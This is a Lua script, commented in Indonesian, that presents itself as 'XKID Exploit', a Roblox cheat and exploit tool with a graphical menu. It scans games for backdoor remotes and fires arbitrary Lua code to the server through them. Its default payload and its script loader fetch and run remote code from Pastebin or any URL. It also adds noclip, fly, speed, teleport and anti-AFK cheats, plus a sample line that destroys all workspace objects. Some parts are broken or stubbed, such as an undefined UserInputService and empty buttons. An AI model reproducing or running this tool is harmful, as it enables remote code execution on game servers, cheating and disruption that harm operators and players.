--[[
  ╔═══════════════════════════════════════════════════════╗
  ║      💀  X K I D   E X P L O I T   v1.0  💀         ║
  ║      Universal Exploit Tool · Aurora UI              ║
  ║      Fitur: Remote Spy · Backdoor Scanner · Loader   ║
  ╚═══════════════════════════════════════════════════════╝
]]

-- Load Aurora UI
Library = loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/Vovabro46/trash/refs/heads/main/Aurora.lua"
))()

local Win = Library:Window(
    "XKID Exploit",
    "skull",
    "Universal v1.0",
    false
)

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RS = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- ============================================
-- GLOBAL VARIABLES
-- ============================================
local detectedRemotes = {}
local remoteSpyActive = false
local backdoorFound = {}
local executedScripts = {}
local objectSpyActive = false
local scannedObjects = {}

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(title, body, dur)
    pcall(function() Library:Notification(title, body, dur or 3) end)
    print("[ XKID ] " .. title .. " | " .. tostring(body))
end

-- ============================================
-- REMOTE SPY
-- ============================================
local function startRemoteSpy()
    remoteSpyActive = true
    detectedRemotes = {}
    
    -- Scan semua remote yang ada
    local function scanRemotes(container, path)
        path = path or ""
        for _, obj in pairs(container:GetChildren()) do
            local fullPath = path .. "." .. obj.Name
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local remoteType = obj.ClassName
                table.insert(detectedRemotes, {
                    Name = obj.Name,
                    Path = fullPath,
                    Type = remoteType,
                    Object = obj
                })
                print("[ REMOTE ] " .. remoteType .. " ditemukan: " .. fullPath)
                
                -- Spy on RemoteEvent
                if obj:IsA("RemoteEvent") then
                    obj.OnClientEvent:Connect(function(...)
                        local args = {...}
                        print("[ SPY ] " .. obj.Name .. " → ", unpack(args))
                    end)
                end
            end
            if #obj:GetChildren() > 0 then
                scanRemotes(obj, fullPath)
            end
        end
    end
    
    scanRemotes(RS, "ReplicatedStorage")
    scanRemotes(Workspace, "Workspace")
    scanRemotes(LocalPlayer, "LocalPlayer")
    
    notif("Remote Spy", string.format("%d remote ditemukan", #detectedRemotes), 5)
end

local function stopRemoteSpy()
    remoteSpyActive = false
    notif("Remote Spy", "Dimatikan", 2)
end

-- ============================================
-- BACKDOOR SCANNER
-- ============================================
local function scanBackdoor()
    backdoorFound = {}
    
    -- Pola backdoor umum
    local backdoorPatterns = {
        "Admin", "Backdoor", "Server", "Execute", "Loadstring",
        "Run", "Command", "Control", "AdminPanel", "ServerControl",
        "RemoteAdmin", "AdminCommand", "ServerCommand", "ExecuteCommand"
    }
    
    -- Scan di ReplicatedStorage
    for _, obj in pairs(RS:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            for _, pattern in ipairs(backdoorPatterns) do
                if obj.Name:find(pattern, 1, true) then
                    table.insert(backdoorFound, {
                        Name = obj.Name,
                        Path = "ReplicatedStorage." .. obj.Name,
                        Type = obj.ClassName,
                        Object = obj,
                        Confidence = "Tinggi"
                    })
                    break
                end
            end
        end
    end
    
    -- Scan di Workspace
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            for _, pattern in ipairs(backdoorPatterns) do
                if obj.Name:find(pattern, 1, true) then
                    table.insert(backdoorFound, {
                        Name = obj.Name,
                        Path = "Workspace." .. obj.Name,
                        Type = obj.ClassName,
                        Object = obj,
                        Confidence = "Tinggi"
                    })
                    break
                end
            end
        end
    end
    
    -- Cari juga yang namanya mencurigakan (mengandung karakter aneh)
    for _, obj in pairs(RS:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name:match("[^%w_]") or #obj.Name > 30 then
                table.insert(backdoorFound, {
                    Name = obj.Name,
                    Path = "ReplicatedStorage." .. obj.Name,
                    Type = obj.ClassName,
                    Object = obj,
                    Confidence = "Mencurigakan"
                })
            end
        end
    end
    
    notif("Backdoor Scanner", string.format("%d backdoor potensial ditemukan", #backdoorFound), 5)
    return backdoorFound
end

-- ============================================
-- EXECUTE SERVER-SIDE CODE (jika ada backdoor)
-- ============================================
local function executeServerCode(code, remote)
    if not remote then
        -- Coba cari remote yang bisa mengeksekusi kode
        for _, bd in ipairs(backdoorFound) do
            if bd.Confidence == "Tinggi" then
                remote = bd.Object
                break
            end
        end
    end
    
    if not remote then
        notif("Gagal", "Tidak ada backdoor yang bisa digunakan", 3)
        return false
    end
    
    local success, result = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(code)
            return "Fired"
        else
            return remote:InvokeServer(code)
        end
    end)
    
    if success then
        table.insert(executedScripts, {
            Code = code:sub(1, 50) .. "...",
            Remote = remote.Name,
            Time = os.time()
        })
        notif("Sukses", "Kode dieksekusi via " .. remote.Name, 3)
    else
        notif("Gagal", tostring(result), 3)
    end
    
    return success
end

-- ============================================
-- OBJECT SPY (scan object di workspace)
-- ============================================
local function startObjectSpy()
    objectSpyActive = true
    scannedObjects = {}
    
    local function scanObjects(container, depth)
        depth = depth or 0
        if depth > 5 then return end -- Batasi kedalaman
        
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("BasePart") or obj:IsA("Model") then
                table.insert(scannedObjects, {
                    Name = obj.Name,
                    Class = obj.ClassName,
                    Path = container.Name .. "." .. obj.Name,
                    Position = obj:IsA("BasePart") and obj.Position or nil
                })
            end
            if #obj:GetChildren() > 0 then
                scanObjects(obj, depth + 1)
            end
        end
    end
    
    scanObjects(Workspace, 0)
    notif("Object Spy", string.format("%d object ditemukan", #scannedObjects), 5)
end

-- ============================================
-- FIRE REMOTE MANUAL
-- ============================================
local function fireRemoteManual(remotePath, ...)
    local remote = loadstring("return " .. remotePath)()
    if not remote then
        notif("Error", "Remote tidak ditemukan", 2)
        return false
    end
    
    local success, result = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(...)
            return "Fired"
        else
            return remote:InvokeServer(...)
        end
    end)
    
    notif(success and "Sukses" or "Gagal", tostring(result), 3)
    return success
end

-- ============================================
-- LOAD EXTERNAL SCRIPT
-- ============================================
local function loadExternalScript(url)
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if not success then
        notif("Error", "Gagal mengambil script", 3)
        return false
    end
    
    local loadSuccess, loadError = pcall(function()
        loadstring(result)()
    end)
    
    if loadSuccess then
        notif("Sukses", "Script loaded", 3)
        table.insert(executedScripts, {
            Code = "External: " .. url,
            Remote = "N/A",
            Time = os.time()
        })
    else
        notif("Error", "Gagal execute: " .. tostring(loadError), 5)
    end
    
    return loadSuccess
end

-- ============================================
-- UNIVERSAL EXPLOITS
-- ============================================

-- Noclip
local noclipActive = false
local noclipConnection = nil

local function toggleNoclip(state)
    noclipActive = state
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    
    if state then
        noclipConnection = RunService.Stepped:Connect(function()
            if LocalPlayer.Character then
                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
        notif("Noclip", "Aktif", 2)
    else
        notif("Noclip", "Mati", 2)
    end
end

-- Fly
local flyActive = false
local flyConnection = nil
local flyBodyVelocity = nil

local function toggleFly(state)
    flyActive = state
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
    if flyBodyVelocity then
        flyBodyVelocity:Destroy()
        flyBodyVelocity = nil
    end
    
    if state and LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            flyBodyVelocity = Instance.new("BodyVelocity")
            flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
            flyBodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
            flyBodyVelocity.Parent = root
            
            flyConnection = RunService.Heartbeat:Connect(function()
                if not flyActive or not LocalPlayer.Character then return end
                local moveDir = Vector3.new()
                local camera = Workspace.CurrentCamera
                
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                    moveDir = moveDir + camera.CFrame.LookVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                    moveDir = moveDir - camera.CFrame.LookVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                    moveDir = moveDir - camera.CFrame.RightVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                    moveDir = moveDir + camera.CFrame.RightVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                    moveDir = moveDir + Vector3.new(0, 1, 0)
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                    moveDir = moveDir - Vector3.new(0, 1, 0)
                end
                
                if moveDir.Magnitude > 0 then
                    flyBodyVelocity.Velocity = moveDir.Unit * 50
                else
                    flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
                end
            end)
        end
        notif("Fly", "Aktif (WASD + Space/Ctrl)", 3)
    else
        notif("Fly", "Mati", 2)
    end
end

-- Speed
local function setSpeed(value)
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = value
            notif("Speed", string.format("%.0f", value), 1)
        end
    end
end

-- Jump Power
local function setJumpPower(value)
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.JumpPower = value
            notif("Jump", string.format("%.0f", value), 1)
        end
    end
end

-- Infinite Jump
local infiniteJumpActive = false
local infiniteJumpConnection = nil

local function toggleInfiniteJump(state)
    infiniteJumpActive = state
    if infiniteJumpConnection then
        infiniteJumpConnection:Disconnect()
        infiniteJumpConnection = nil
    end
    
    if state then
        infiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
            if infiniteJumpActive and LocalPlayer.Character then
                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        notif("Infinite Jump", "Aktif", 2)
    else
        notif("Infinite Jump", "Mati", 2)
    end
end

-- Anti AFK
local antiAFKActive = false
local antiAFKConnection = nil

local function toggleAntiAFK(state)
    antiAFKActive = state
    if antiAFKConnection then
        antiAFKConnection:Disconnect()
        antiAFKConnection = nil
    end
    
    if state then
        antiAFKConnection = LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
        notif("Anti AFK", "Aktif", 2)
    else
        notif("Anti AFK", "Mati", 2)
    end
end

-- Teleport to mouse
local function teleportToMouse()
    local mouse = LocalPlayer:GetMouse()
    if mouse and mouse.Hit and LocalPlayer.Character then
        LocalPlayer.Character:SetPrimaryPartCFrame(mouse.Hit + Vector3.new(0, 3, 0))
        notif("Teleport", "Ke posisi mouse", 2)
    end
end

-- ============================================
-- BUILD UI
-- ============================================

Win:TabSection("EXPLOIT TOOLS")
local SpyTab = Win:Tab("Remote Spy", "radio")
local BackdoorTab = Win:Tab("Backdoor", "skull")
local LoaderTab = Win:Tab("Loader", "download")
local UniversalTab = Win:Tab("Universal", "zap")

Win:TabSection("UTILITY")
local ObjectTab = Win:Tab("Object Spy", "eye")
local ExecTab = Win:Tab("Execute", "code")
local TpTab = Win:Tab("Teleport", "map-pin")
local SetTab = Win:Tab("Settings", "settings")

-- ============================================
-- REMOTE SPY TAB
-- ============================================
local SpyPage = SpyTab:Page("Remote Scanner", "radio")
local SpyLeft = SpyPage:Section("Control", "Left")
local SpyRight = SpyPage:Section("Results", "Right")

SpyLeft:Button("🔍 Start Remote Spy", "Scan semua remote di game",
    function()
        startRemoteSpy()
    end)

SpyLeft:Button("⏹ Stop Remote Spy", "Hentikan spy",
    stopRemoteSpy)

SpyLeft:Button("📋 Tampilkan Hasil", "Lihat daftar remote di console",
    function()
        print("===== REMOTE DITEMUKAN =====")
        for i, r in ipairs(detectedRemotes) do
            print(string.format("%d. [%s] %s", i, r.Type, r.Path))
        end
        notif("Remote", #detectedRemotes .. " remote (cek console)", 3)
    end)

SpyRight:Paragraph("Info",
    "Remote Spy akan:\n" ..
    "• Mendeteksi semua RemoteEvent/Function\n" ..
    "• Menampilkan path lengkap\n" ..
    "• Mencatat semua pemanggilan remote\n" ..
    "• Berguna untuk menemukan celah")

-- ============================================
-- BACKDOOR TAB
-- ============================================
local BackdoorPage = BackdoorTab:Page("Backdoor Scanner", "skull")
local BackdoorLeft = BackdoorPage:Section("Scanner", "Left")
local BackdoorRight = BackdoorPage:Section("Execute", "Right")

BackdoorLeft:Button("🔎 Scan Backdoor", "Cari backdoor potensial",
    function()
        local results = scanBackdoor()
        print("===== BACKDOOR DITEMUKAN =====")
        for i, bd in ipairs(results) do
            print(string.format("%d. [%s] %s (%s)", i, bd.Confidence, bd.Path, bd.Type))
        end
        notif("Backdoor", #results .. " potensial (cek console)", 5)
    end)

BackdoorLeft:Button("📋 List Backdoor", "Tampilkan di console",
    function()
        print("===== BACKDOOR LIST =====")
        for i, bd in ipairs(backdoorFound) do
            print(string.format("%d. %s - %s", i, bd.Name, bd.Confidence))
        end
    end)

BackdoorRight:Input("Server Code", "Masukkan kode Lua untuk dieksekusi di server",
    function(code)
        if code and #code > 0 then
            executeServerCode(code)
        end
    end)

BackdoorRight:Button("🔥 Execute (Pilih Backdoor Pertama)", "Jalankan kode di server",
    function()
        local code = "print('XKID Exploit') loadstring(game:HttpGet('https://pastebin.com/raw/xxx'))()"
        executeServerCode(code)
    end)

BackdoorRight:Paragraph("Contoh Kode",
    "loadstring(game:HttpGet('URL'))()\n" ..
    "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 200\n" ..
    "for _,v in pairs(game.Workspace:GetChildren()) do v:Destroy() end")

-- ============================================
-- LOADER TAB
-- ============================================
local LoaderPage = LoaderTab:Page("Script Loader", "download")
local LoaderLeft = LoaderPage:Section("Load External", "Left")
local LoaderRight = LoaderPage:Section("History", "Right")

LoaderLeft:Input("Script URL", "Masukkan URL script (raw)",
    function(url)
        if url and #url > 0 then
            loadExternalScript(url)
        end
    end)

LoaderLeft:Button("🔥 Load XKID Hub", "Load hub sendiri",
    function()
        -- Ganti dengan URL hub lo
        loadExternalScript("https://raw.githubusercontent.com/username/repo/main/script.lua")
    end)

LoaderLeft:Button("📋 Copy URL Contoh", "Copy paste contoh URL",
    function()
        setclipboard and setclipboard("https://raw.githubusercontent.com/...")
        notif("Copied", "URL contoh di-copy", 2)
    end)

LoaderRight:Button("📜 Tampilkan History", "Lihat script yang sudah di-load",
    function()
        print("===== EXECUTION HISTORY =====")
        for i, s in ipairs(executedScripts) do
            print(string.format("%d. %s - %s", i, s.Code, os.date("%H:%M:%S", s.Time)))
        end
    end)

-- ============================================
-- UNIVERSAL TAB
-- ============================================
local UniPage = UniversalTab:Page("Universal Exploits", "zap")
local UniLeft = UniPage:Section("Movement", "Left")
local UniRight = UniPage:Section("Misc", "Right")

UniLeft:Toggle("Noclip", "NoclipToggle", false,
    "Tembus dinding",
    toggleNoclip)

UniLeft:Toggle("Fly", "FlyToggle", false,
    "Terbang (WASD + Space/Ctrl)",
    toggleFly)

UniLeft:Slider("WalkSpeed", "SpeedSlider", 16, 500, 16,
    setSpeed, "Kecepatan jalan")

UniLeft:Slider("JumpPower", "JumpSlider", 50, 500, 50,
    setJumpPower, "Kekuatan lompat")

UniLeft:Toggle("Infinite Jump", "InfJumpToggle", false,
    "Lompat terus di udara",
    toggleInfiniteJump)

UniRight:Toggle("Anti AFK", "AntiAFKToggle", false,
    "Cegah disconnect",
    toggleAntiAFK)

UniRight:Button("📍 Teleport ke Mouse", "Pindah ke posisi kursor",
    teleportToMouse)

UniRight:Button("💀 Reset Character", "Mati lalu respawn",
    function()
        if LocalPlayer.Character then
            LocalPlayer.Character:BreakJoints()
        end
    end)

UniRight:Button("🔄 Rejoin Server", "Koneksi ulang ke server",
    function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)

-- ============================================
-- OBJECT SPY TAB
-- ============================================
local ObjPage = ObjectTab:Page("Object Scanner", "eye")
local ObjLeft = ObjPage:Section("Scan", "Left")
local ObjRight = ObjPage:Section("Results", "Right")

ObjLeft:Button("🔍 Start Object Spy", "Scan object di Workspace",
    function()
        startObjectSpy()
    end)

ObjLeft:Button("📋 List Objects", "Tampilkan di console",
    function()
        print("===== OBJECT DITEMUKAN =====")
        for i, obj in ipairs(scannedObjects) do
            print(string.format("%d. [%s] %s", i, obj.Class, obj.Path))
        end
        notif("Object", #scannedObjects .. " object (cek console)", 3)
    end)

ObjLeft:Input("Cari Object", "Masukkan nama object",
    function(query)
        if query and #query > 0 then
            print("===== HASIL PENCARIAN: " .. query .. " =====")
            for _, obj in ipairs(scannedObjects) do
                if obj.Name:lower():find(query:lower()) then
                    print(string.format("[%s] %s", obj.Class, obj.Path))
                end
            end
        end
    end)

ObjRight:Paragraph("Info",
    "Object Spy akan:\n" ..
    "• Scan semua BasePart & Model\n" ..
    "• Menampilkan path lengkap\n" ..
    "• Berguna untuk menemukan object penting")

-- ============================================
-- EXECUTE TAB
-- ============================================
local ExecPage = ExecTab:Page("Manual Execute", "code")
local ExecLeft = ExecPage:Section("Remote Executor", "Left")
local ExecRight = ExecPage:Section("Fire Remote", "Right")

ExecLeft:Input("Kode Lua", "Masukkan kode untuk dieksekusi client-side",
    function(code)
        if code and #code > 0 then
            local success, err = pcall(function()
                loadstring(code)()
            end)
            notif(success and "Sukses" or "Error", success and "Kode dijalankan" or err, 3)
        end
    end)

ExecLeft:Button("⚡ Execute", "Jalankan kode di atas",
    function()
        -- Ambil dari input terakhir (perlu disimpan)
    end)

ExecRight:Input("Remote Path", "Contoh: game.ReplicatedStorage.Remotes.Event",
    function(path)
        if path and #path > 0 then
            -- Simpan path untuk digunakan
        end
    end)

ExecRight:Input("Arguments", "Pisahkan dengan koma",
    function(args)
        -- Simpan args
    end)

ExecRight:Button("🔥 Fire Remote", "Kirim ke server",
    function()
        -- Implementasi fire remote manual
    end)

-- ============================================
-- TELEPORT TAB
-- ============================================
local TpPage = TpTab:Page("Teleport", "map-pin")
local TpLeft = TpPage:Section("Coordinates", "Left")
local TpRight = TpPage:Section("Saved Positions", "Right")

TpLeft:Input("X Y Z", "Masukkan koordinat (pisah spasi)",
    function(input)
        if input then
            local x, y, z = input:match("([%d%-%.]+)%s+([%d%-%.]+)%s+([%d%-%.]+)")
            if x and y and z and LocalPlayer.Character then
                LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(x, y, z))
                notif("Teleport", string.format("X=%s Y=%s Z=%s", x, y, z), 3)
            end
        end
    end)

TpLeft:Button("📍 Posisi Saya", "Lihat koordinat",
    function()
        local pos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if pos then
            local p = pos.Position
            notif("Posisi", string.format("X=%.1f Y=%.1f Z=%.1f", p.X, p.Y, p.Z), 5)
        end
    end)

-- Save slots
for i = 1, 5 do
    TpRight:Button(string.format("💾 Save Slot %d", i), "Simpan posisi",
        function()
            local pos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if pos then
                _G["savedPos"..i] = pos.CFrame
                notif("Slot "..i, "Posisi tersimpan", 2)
            end
        end)
    TpRight:Button(string.format("🚀 Load Slot %d", i), "Teleport ke slot",
        function()
            if _G["savedPos"..i] and LocalPlayer.Character then
                LocalPlayer.Character:SetPrimaryPartCFrame(_G["savedPos"..i])
                notif("Slot "..i, "Teleport", 2)
            end
        end)
end

-- ============================================
-- SETTINGS TAB
-- ============================================
local SetPage = SetTab:Page("Settings", "settings")
local SetLeft = SetPage:Section("Options", "Left")
local SetRight = SetPage:Section("Info", "Right")

SetLeft:Button("⛔ Stop All", "Matikan semua exploit",
    function()
        toggleNoclip(false)
        toggleFly(false)
        toggleInfiniteJump(false)
        toggleAntiAFK(false)
        stopRemoteSpy()
        notif("Stop All", "Semua exploit dimatikan", 3)
    end)

SetLeft:Button("🔄 Reset", "Reset semua state",
    function()
        detectedRemotes = {}
        backdoorFound = {}
        executedScripts = {}
        scannedObjects = {}
        notif("Reset", "Semua data di-reset", 2)
    end)

SetRight:Paragraph("XKID Exploit v1.0",
    "Universal Exploit Tool\n" ..
    "Fitur:\n" ..
    "• Remote Spy\n" ..
    "• Backdoor Scanner\n" ..
    "• Server-Side Executor\n" ..
    "• Universal Exploits (Fly/Noclip)\n" ..
    "• Object Spy\n" ..
    "• Script Loader\n\n" ..
    "Gunakan dengan bijak!")

-- ============================================
-- INIT
-- ============================================
Library:Notification("XKID Exploit", "Universal Tool Loaded!", 5)
Library:ConfigSystem(Win)

print("╔══════════════════════════════════════════╗")
print("║   💀  XKID EXPLOIT v1.0  — UNIVERSAL   ║")
print("║   Remote Spy · Backdoor · Loader        ║")
print("║   Player: " .. LocalPlayer.Name)
print("╚══════════════════════════════════════════╝")